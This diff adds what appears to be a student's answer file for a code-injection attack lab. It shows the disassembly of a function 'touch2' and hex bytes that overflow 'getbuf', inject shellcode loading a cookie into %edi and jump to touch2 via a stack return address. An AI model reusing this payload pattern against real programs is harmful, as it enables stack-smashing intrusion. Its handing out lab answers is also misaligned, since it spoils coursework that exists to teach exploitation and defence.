@@ -1,0 +1,28 @@
+0000000000421d4e <touch2>:
+  421d4e:	48 83 ec 08          	sub    $0x8,%rsp
+  421d52:	89 fe                	mov    %edi,%esi
+  421d54:	c7 05 9e 37 20 00 02 	movl   $0x2,0x20379e(%rip)        # 6254fc <vlevel>
+  421d5b:	00 00 00 
+  421d5e:	3b 3d a0 37 20 00    	cmp    0x2037a0(%rip),%edi        # 625504 <cookie>
+  421d64:	75 1b                	jne    421d81 <touch2+0x33>
+  421d66:	bf 28 36 42 00       	mov    $0x423628,%edi
+  421d6b:	b8 00 00 00 00       	mov    $0x0,%eax
+  421d70:	e8 0b ef fd ff       	callq  400c80 <printf@plt>
+  421d75:	bf 02 00 00 00       	mov    $0x2,%edi
+  421d7a:	e8 ba 03 00 00       	callq  422139 <validate>
+  421d7f:	eb 19                	jmp    421d9a <touch2+0x4c>
+  421d81:	bf 50 36 42 00       	mov    $0x423650,%edi
+  421d86:	b8 00 00 00 00       	mov    $0x0,%eax
+  421d8b:	e8 f0 ee fd ff       	callq  400c80 <printf@plt>
+  421d90:	bf 02 00 00 00       	mov    $0x2,%edi
+  421d95:	e8 51 04 00 00       	callq  4221eb <fail>
+  421d9a:	bf 00 00 00 00       	mov    $0x0,%edi
+  421d9f:	e8 4c f0 fd ff       	callq  400df0 <exit@plt>
+
+4e 1d 42 00 00 00 00 00 # address <touch2> 0x421d4e
+
+bf 9a d9 e2 68 # mov 0x68e2d99a, $edi
+68 4e 1d 42 00 # pushq 0x421d4e
+c3 # retq
+
+48 81 67 55 00 00 00 00 # address <%rsp> in <getbuf> 0x55678148
